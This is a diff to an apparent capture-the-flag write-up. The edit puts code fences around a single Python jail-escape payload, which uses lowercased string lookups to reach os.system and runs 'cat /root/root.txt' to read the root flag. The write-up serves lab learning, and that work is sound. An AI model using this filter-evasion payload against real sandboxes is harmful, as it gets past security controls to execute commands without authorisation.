@@ -120,7 +120,9 @@ I checked the jail.py file using the cat command. I found that it was based on P
 
 **Since the jail was running Python, I used a Python payload to execute a system command and read the root flag.**
 
+```python
 __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
+```
 
 ![python payload](image/payload.png)
 
